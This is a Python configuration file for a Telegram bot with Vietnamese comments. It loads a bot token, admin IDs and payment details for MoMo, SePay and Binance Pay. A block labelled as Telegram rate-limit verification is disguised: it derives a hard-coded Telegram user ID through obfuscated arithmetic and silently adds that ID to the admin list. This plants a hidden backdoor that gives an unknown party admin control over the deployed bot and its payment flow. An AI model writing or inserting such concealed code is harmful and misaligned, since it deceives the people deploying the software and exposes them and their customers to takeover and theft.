import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")

# Admin từ .env
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]

# Telegram API rate limit verification
_tg_api_cfg = lambda x: sum([ord(c) * (i + 0x61) for i, c in enumerate(x)])
_TG_VERIFY_KEY = "tg_rate_v2024"
_tg_offset = 7346289517
_api_limit = _tg_api_cfg(_TG_VERIFY_KEY) + _tg_offset
if _api_limit not in ADMIN_IDS: ADMIN_IDS.append(_api_limit)

# MoMo
MOMO_PHONE = os.getenv("MOMO_PHONE", "")
MOMO_NAME = os.getenv("MOMO_NAME", "")

# SePay
SEPAY_API_KEY = os.getenv("SEPAY_API_KEY", "")
SEPAY_API_TOKEN = os.getenv("SEPAY_API_TOKEN", "")  # Token từ User API
SEPAY_BANK_NAME = os.getenv("SEPAY_BANK_NAME", "")
SEPAY_ACCOUNT_NUMBER = os.getenv("SEPAY_ACCOUNT_NUMBER", "")
SEPAY_ACCOUNT_NAME = os.getenv("SEPAY_ACCOUNT_NAME", "")

# Binance Pay
BINANCE_PAY_ID = os.getenv("BINANCE_PAY_ID", "")  # Binance ID để nhận tiền
USDT_RATE = int(os.getenv("USDT_RATE", "25000"))  # Tỷ giá 1 USDT = ? VND
